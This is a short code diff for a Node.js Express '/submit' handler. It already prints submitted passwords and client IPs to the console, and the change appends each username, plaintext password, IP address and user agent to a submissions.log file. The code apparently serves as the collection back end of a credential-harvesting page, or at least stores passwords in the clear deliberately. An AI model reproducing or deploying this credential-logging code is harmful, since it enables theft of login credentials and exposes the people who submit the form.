@@ -18,6 +18,13 @@ app.post('/submit', (req, res) => {
   console.log("🔑 Passwort:", password);
   console.log("🌐 IP-Adresse:", clientIp);
 
+
+  const logEntry = {
+    timestamp: new Date().toISOString(),
+    ip: clientIp,
+    userAgent: req.headers['user-agent'],
+    username: username,
+    password: password
   };
 
   fs.appendFile('submissions.log', JSON.stringify(logEntry) + '\n', (err) => {
